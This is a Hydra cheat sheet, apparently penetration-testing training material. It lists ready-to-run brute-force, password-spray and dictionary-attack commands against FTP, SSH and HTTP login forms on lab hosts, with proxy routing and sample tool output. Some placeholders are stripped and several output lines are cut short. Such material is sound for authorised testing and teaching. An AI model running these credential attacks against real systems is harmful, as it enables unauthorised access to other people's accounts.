
Hydra is a popular open-source password-cracking tool. It is designed to perform brute-force attacks, password spray, and dictionary attacks to crack passwords on various network protocols. Hydra supports a wide range of services and protocols, including but not limited to SSH, FTP, HTTP, Telnet, MySQL, and more.

Syntax: hydra -L <username_list_file> -p <password> <server_name> http-post-form "/login:<user_field>=^USER^&<password_field>=^PASS^:valid"

• -L : Specifies the path to a file containing a list of usernames. Replace with the actual file path.
• -p : Specifies the password to be used during the attack. Replace with the actual password you want to test.
• : Specifies the target server's IP address or hostname. Replace with the actual target URL or IP address.

http-post-form "/login:=^USER^&=^PASS^:valid": Specifies the HTTP POST form parameters for the login. Here's a breakdown of the form parameters:

• /login: Specifies the path to the login page on the target server.
• : Replace this with the actual name of the form field where the username is entered.
• ^USER^: This is a placeholder that Hydra will replace with the usernames from the provided list.
• : Replace this with the actual name of the form field where the password is entered.
• ^PASS^: This is a placeholder that Hydra will replace with the passwords from the provided list.
• :valid: Specifies that a login response contains the word "valid."


hydra -h

Password Spraying: hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 demo.ine.local http-post-form "/login:username=^USER^&password=^PASS^:valid"

Guess Password for specific username: hydra -l ignite -P pass.txt 192.168.1.141 ftp

Guess username for specific password: hydra -L users.txt -p 123 192.168.1.141 ftp

Brute forcing Username and Password: hydra -L users.txt -P pass.txt 192.168.1.141 ftp

Verbose and Debug Mode: 
hydra -L users.txt -P pass.txt 192.168.1.141 ftp -V
hydra -l ignite -P pass.txt 192.168.1.141 ftp -d

NULL/Same as Login or Reverse login Attempt: hydra -L users.txt -P pass.txt 192.168.1.141 ftp -V -e nsr

Saving output in Disk: 
hydra -L users.txt -P pass.txt 192.168.1.141 ftp -o result.txt
hydra -L users.txt -P pass.txt 192.168.1.141 ftp -o result:json

To Resume Brute Force Attack: 
hydra -L users.txt -P pass.txt 192.168.1.141 ftp
hydra -R

Password generating using various set of characters: 
hydra -l ignite -x 1:3:1 ftp://192.168.1.141
hydra -l ignite -x 1:3:1 ftp://192.168.1.141 -v

To attack a specific port rather than default: 
nmap -sV 192.168.1.141
hydra -L users.txt -P pass.txt 192.168.1.141 ssh -s 2222

Attacking Multiple Hosts: 
hydra -L users.txt -P pass.txt -M hosts.txt ftp
hydra -L users.txt -P pass.txt -M hosts.txt ftp -F

Using Combo Entries:
cat userpass.txt
hydra -C userpass.txt 192.168.1.141 ftp

Concurrent Testing on Multiple Logins: hydra -L users.txt -P pass.txt 192.168.1.141 ftp -t 3 -V

HTTP Login Form Brute Force: 
hydra -l admin -P pass.txt 192.168.1.150 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
hydra 192.168.1.150 -l admin -P ‘pass.txt’ http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d; security=low"

<div class="vulnerable_code_area">
    <h2>Login</h2>

    <form action="#" method="GET">
        Username:<br><input type="text" name="username"><br>
        Password:<br><input type="password" AUTOCOMPLETE="off" name="password"><br>
        <input type="submit" value="Login" name="Login">
    </form>
</div>


Service module Usage information: hydra http-get-form -U

Attacking on secured service connection:
hydra -l ignite -P pass.txt ftp://192.168.1.141
hydra -l ignite -P pass.txt ftps://192.168.1.141

hydra -l ignite -P pass.txt 192.168.1.141 ftp
hydra -l ignite -P pass.txt 192.168.1.141 ftps


Proxy Support: hydra -l ignite -P pass.txt 192.168.1.141 ftp

[root@kali]~#
# hydra -l ignite -P pass.txt 192.168.1.141 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-19 15:1
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (1:1/p:8), ~1
[DATA] attacking ftp://192.168.1.141:21/
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-19 15:1

[root@kali]~#
# nmap -sV 192.168.1.141
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 15:11 EDT
Nmap scan report for 192.168.1.141
Host is up (0.000086s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  tcpwrapped
80/tcp   open  http        Apache httpd 2.4.41
1080/tcp open  socks5      (No authentication; connection failed)***
3128/tcp open  http-proxy  Squid http proxy 4.10
MAC Address: 00:0C:29:10:98:21 (VMware)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://n
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds


Unauthenticated Proxy: 
export HYDRA_PROXY=socks5://192.168.1.141:1080
hydra -l ignite -P pass.txt 192.168.1.141 ftp


Proxychains: proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp


Authenticated Proxy
proxychains hydra -l ignite -p pass.txt 192.168.1.141 ftp
cat /etc/proxychains4.conf
proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp

Environment Variable: export HYDRA_PROXY=socks5://raj:1234@192.168.1.141:1080

hydra -l ignite -P pass.txt 192.168.1.141 ftp
















